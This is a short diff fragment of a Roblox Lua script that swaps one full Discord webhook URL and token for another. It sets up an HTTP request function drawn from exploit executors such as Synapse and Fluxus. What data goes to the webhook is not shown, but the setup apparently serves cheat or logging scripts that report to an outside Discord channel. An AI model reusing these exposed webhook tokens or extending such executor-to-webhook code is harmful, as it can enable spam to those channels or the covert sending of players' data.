@@ -12,7 +12,7 @@ local UserInputService = game:GetService("UserInputService")
 local StarterGui = game:GetService("StarterGui")
 
 --// Webhook
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1468809532267434138/coA1jn4RO4Ui9G0xGAoikIDfT1XT8ugKeRnMPszyZqalHq7yeuDGbXN4y_SQvqdGBk4J"
 local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 
 if req then
